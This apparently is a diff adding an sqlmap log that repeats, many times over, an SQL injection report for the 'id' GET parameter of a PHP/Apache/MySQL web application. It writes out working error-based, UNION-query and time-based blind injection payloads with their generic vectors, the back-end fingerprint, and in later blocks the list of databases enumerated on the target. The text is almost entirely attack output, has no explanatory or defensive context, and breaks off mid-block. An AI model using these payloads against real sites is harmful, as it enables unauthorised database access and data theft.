@@ -1,0 +1,2765 @@
+sqlmap identified the following injection points with a total of 40 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
